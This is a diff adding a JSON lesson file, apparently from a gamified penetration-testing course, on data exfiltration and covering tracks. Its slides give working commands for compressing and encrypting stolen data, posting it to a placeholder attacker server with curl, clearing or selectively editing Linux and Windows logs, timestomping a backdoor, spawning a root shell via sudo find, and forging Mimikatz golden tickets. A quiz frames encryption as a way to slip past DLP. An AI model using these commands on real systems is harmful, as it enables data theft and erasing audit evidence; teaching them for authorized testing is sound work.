@@ -1,0 +1,82 @@
+{
+    "id": "l6",
+    "chapterId": "ch_11",
+    "title": "Data Exfiltration & Covering Tracks 🧹",
+    "description": "Steal sensitive data and erase evidence of your presence.",
+    "xpReward": 35,
+    "estimatedMinutes": 10,
+    "section": "Exfiltration & Cleanup",
+    "slides": [
+        {
+            "id": "s_l6_1",
+            "type": "text",
+            "title": "Finding the Crown Jewels 💎",
+            "content": "# What to Steal\n\nAfter mapping the network, identify high-value targets for exfiltration.\n\n**Common Data Targets:**\n- **Databases**: Dump entire SQL databases (`mysqldump`, `pg_dump`).\n- **Source Code**: `.git` folders, `src` directories.\n- **Credentials**: `SAM` hive, `NTDS.dit` (Active Directory database), browser password stores.\n- **Sensitive Files**: Search for `*.docx`, `*.xlsx`, `*.pdf` containing keywords like 'confidential', 'password', 'secret'.\n\n**Searching for Files:**\n```bash\n# Linux: Find files modified in last 7 days\nfind / -type f -name \"*.pdf\" -mtime -7 2>/dev/null\n\n# Windows: Find files containing 'password'\nfindstr /s /i /m \"password\" *.txt *.config *.xml\n```"
+        },
+        {
+            "id": "s_l6_2",
+            "type": "text",
+            "title": "Exfiltration Techniques 📤",
+            "content": "# Getting Data Out Without Detection\n\nTransferring gigabytes of data will trigger network monitoring alerts. You must be stealthy.\n\n**1. Compression & Encryption**\nAlways compress (`.zip`, `.tar.gz`) and **encrypt** the data before transfer.\n```bash\ntar -czf - /sensitive/folder | openssl enc -aes-256-cbc -pass pass:Secret123 -out data.enc\n```\n\n**2. HTTP/HTTPS POST**\n`curl -F \"file=@data.enc\" http://your-server.com/upload` (Looks like normal web traffic).\n\n**3. DNS Tunneling**\nEncode data into DNS queries (`dnscat2`, `iodine`). Slow but often allowed through firewalls.\n\n**4. Cloud Services**\nUpload to Google Drive, Dropbox, or Azure Blob Storage using built-in tools or API keys found on the system.\n\n**5. Steganography**\nHide data inside image or audio files before transfer."
+        },
+        {
+            "id": "s_l6_3",
+            "type": "quiz",
+            "title": "Exfiltration Awareness 🧠",
+            "content": "",
+            "quizData": {
+                "id": "q_l6_1",
+                "type": "multiple_choice",
+                "question": "Why is encrypting data before exfiltration important?",
+                "options": [
+                    {
+                        "id": "opt1",
+                        "text": "It compresses the data to save bandwidth.",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt2",
+                        "text": "It prevents Data Loss Prevention (DLP) systems from inspecting the content and blocking the transfer.",
+                        "isCorrect": true
+                    },
+                    {
+                        "id": "opt3",
+                        "text": "It is required by law.",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt4",
+                        "text": "It makes the file smaller.",
+                        "isCorrect": false
+                    }
+                ],
+                "explanation": "Encryption hides the true nature of the data, bypassing signature-based DLP filters.",
+                "xpReward": 10
+            }
+        },
+        {
+            "id": "s_l6_4",
+            "type": "text",
+            "title": "Covering Tracks: Log Manipulation 🧹",
+            "content": "# Erasing Your Footprints\n\nEvery action you took (login, command execution, file creation) is logged. Professional attackers clear these logs.\n\n**Linux Log Files to Clear:**\n- **Auth Log**: `/var/log/auth.log` (SSH logins, sudo attempts)\n- **Syslog**: `/var/log/syslog`\n- **Bash History**: `~/.bash_history`\n- **Command**: `echo \"\" > /var/log/auth.log` (Clears file).\n- **Stealthier**: Use `sed -i '/192.168.56.102/d' /var/log/auth.log` to remove only lines containing your IP.\n\n**Windows Event Logs to Clear:**\n- **Security**: Logins (Event ID 4624), Privilege Use (4672).\n- **System**: Service creation (7045).\n- **PowerShell**: Script block logging (4104).\n- **Command**: `wevtutil cl Security` (Clears the Security log). **This is extremely suspicious!**\n- **Stealthier**: Use PowerShell to delete specific events by ID or time.\n\n**Timestomping**\nChange the 'last modified' timestamp of files you created to blend in.\n```bash\ntouch -r /bin/ls backdoor.sh\n```"
+        },
+        {
+            "id": "s_l6_5",
+            "type": "warning",
+            "title": "Clearing Logs is a Red Flag 🚩",
+            "content": "## You Might Trigger an Alert\n\nIn a mature SOC, **clearing logs triggers an immediate critical alert**. The absence of logs is itself an indicator of compromise. In a red team engagement, you might avoid logging altogether (e.g., using memory-only payloads) rather than wiping logs. For a penetration test, document that you *could* clear logs, but **do not actually do it** unless explicitly authorized in the Rules of Engagement."
+        },
+        {
+            "id": "s_l6_6",
+            "type": "text",
+            "title": "The Final Report: Post-Exploitation Findings 📝",
+            "content": "# Documenting the Kill Chain\n\nA successful post-exploitation phase yields critical findings for the report.\n\n**Key Elements to Document:**\n1.  **Privilege Escalation Path**: Step-by-step from initial shell to root/SYSTEM.\n2.  **Persistence Mechanism**: What backdoors were installed (and where).\n3.  **Lateral Movement Map**: Diagram of hosts compromised and credentials used.\n4.  **Data Accessed**: List of sensitive files or databases extracted (or that *could* be extracted).\n5.  **Cleanup Instructions**: Exact commands to remove all artifacts.\n\n**Example Finding:**\n> *Critical: Successful Privilege Escalation to root via Sudo Misconfiguration*\n> *The initial shell was obtained as 'www-data'. The 'sudo -l' command revealed that 'www-data' could run '/usr/bin/find' as root without a password. This was leveraged to spawn a root shell (`sudo find . -exec /bin/sh \\; -quit`). With root access, the attacker gained full control of the server, including access to `/etc/shadow` and the ability to modify system binaries.*"
+        },
+        {
+            "id": "s_l6_7",
+            "type": "tip",
+            "title": "Pro Tip: The Golden Ticket 🚀",
+            "content": "## Ultimate Persistence in Active Directory\n\nIf you compromise the Domain Controller and extract the **KRBTGT** account hash (using Mimikatz `lsadump::dcsync`), you can forge **Golden Tickets**. These allow you to impersonate **any user** in the domain (including Domain Admin) indefinitely. This is the holy grail of Windows post-exploitation."
+        }
+    ]
+}
